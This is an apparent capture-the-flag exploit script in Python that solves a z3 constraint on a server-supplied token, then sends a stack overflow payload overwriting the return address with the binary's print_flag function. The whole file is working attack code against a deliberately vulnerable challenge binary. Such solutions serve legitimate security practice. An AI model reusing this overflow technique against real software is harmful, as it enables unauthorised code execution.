#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5
from z3 import *
from rootkit import *
from time import sleep

exe  = context.binary = ELF('./satisfy')
host = args.HOST or '0.cloud.chals.io'
port = int(args.PORT or 34720)

gdbscript = '''
tbreak main
b *sat_access+85
continue
'''.format(**locals())

libc=SetupLibcELF()

x=BitVec('x',32)                                                                                                                                                                                                 
y=BitVec('y',32)                                                                                                                                                                                                 
z=BitVec('z',32)                                                                                                                                                                                                 
s=Solver()

io = start()

reu(b"<< Here is a random token ")
rand=int(rl().strip(b'\n'))
a1=1
a2=2

s.add(z==rand)
s.add(((x<<y))^z==31337)
s.check()
a1=s.model()[x].as_long()                                                                                                                                                                                                     
a2=s.model()[y].as_long()                                                                                                                                                                                                     
print(s.model())
payload = flat([

	b'a'*16,
	p(a2),
	p(a1),
	p(0xdeadbeef),
	p(exe.sym.print_flag)

])
sl(payload)
io.interactive()
